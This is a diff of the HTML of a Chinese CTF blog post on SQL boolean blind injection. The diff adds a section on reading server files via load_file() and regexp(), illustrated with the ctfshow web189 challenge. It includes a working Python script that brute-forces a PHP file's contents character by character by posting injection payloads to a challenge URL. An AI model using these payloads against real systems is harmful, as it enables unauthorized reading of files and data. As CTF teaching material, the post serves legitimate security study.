@@ -3,7 +3,7 @@
 <html lang="zh-CN">
     <head>
         <meta charset="UTF-8" />
-        <title>SQL盲注 | 雲流のLowest World</title>
+        <title>SQL布尔盲注 | 雲流のLowest World</title>
         <meta name="author" content="C1oudfL0w0" />
         <meta name="description" content="by 一言顶真" />
         <meta name="keywords" content="" />
@@ -64,7 +64,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8"><span class="toc-text">SQL盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#like%E7%9B%B2%E6%B3%A8"><span class="toc-text">like盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#regexp%E7%9B%B2%E6%B3%A8"><span class="toc-text">regexp盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-text">无数字引号盲注</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#like%E7%9B%B2%E6%B3%A8"><span class="toc-text">like盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#regexp%E7%9B%B2%E6%B3%A8"><span class="toc-text">regexp盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-text">无数字引号盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-text">盲注读文件</span></a></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -180,7 +180,7 @@
 
                 <div class="article">
     <div>
-        <h1>SQL盲注</h1>
+        <h1>SQL布尔盲注</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -207,7 +207,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Sql/" style="color: #00a596">Sql</a>
+                <a href="/blog/tags/python/" style="color: #00a596">python</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Sql/" style="color: #03a9f4">Sql</a>
             </span>
             
         </span>
@@ -215,8 +220,8 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><blockquote>
-<p>SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注</p>
+        <h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><blockquote>
+<p>盲注查询是不需要返回结果的，仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False</p>
 </blockquote>
 <p>本篇尽可能结合题目进行说明</p>
 <span id="more"></span>
@@ -352,6 +357,40 @@ flag <span class="token operator">=</span> <span class="token string">'ctfshow&#
             flag <span class="token operator">+=</span> char
             <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
             <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h1 id="盲注读文件"><a href="#盲注读文件" class="headerlink" title="盲注读文件"></a>盲注读文件</h1><blockquote>
+<p>使用<code>load_file()regexp()</code>的方式进行字符串匹配实现文件读取</p>
+</blockquote>
+<p>以ctfshow web189为例</p>
+<p>原理：</p>
+<p>在<code>username=0</code>和<code>username=1</code>时分别有不同的回显</p>
+<p>由此可以进行布尔盲注，根据回显的不同结果来注入</p>
+<p>于是通过<code>loadfile()</code>读取已知flag文件位置的内容，使用<code>regexp()</code>进行匹配，匹配的结果通过<code>if()</code>函数设置为返回0或1</p>
+<p>PS：一般情况下<code>if()</code>也可以替代为<code>case</code>函数或使用<code>||</code>、<code>or</code>等</p>
+<p>脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">from</span> operator <span class="token keyword">import</span> concat
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+url <span class="token operator">=</span> <span class="token string">'http://92baa344-30c3-492b-a2b9-27bb3ffcc387.challenge.ctf.show/api/'</span>
+uuid <span class="token operator">=</span> string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-&#125;"</span>
+passwd <span class="token operator">=</span> <span class="token string">"if(load_file('/var/www/html/api/index.php')regexp('ctfshow&#123;"</span> <span class="token comment">#ctfshow&#123;</span>
+flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> char <span class="token keyword">in</span> uuid<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'username'</span> <span class="token punctuation">:</span> passwd <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">'),0,1)"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token number">0</span>
+        <span class="token punctuation">&#125;</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            passwd <span class="token operator">+=</span> char
+            <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
     </div>
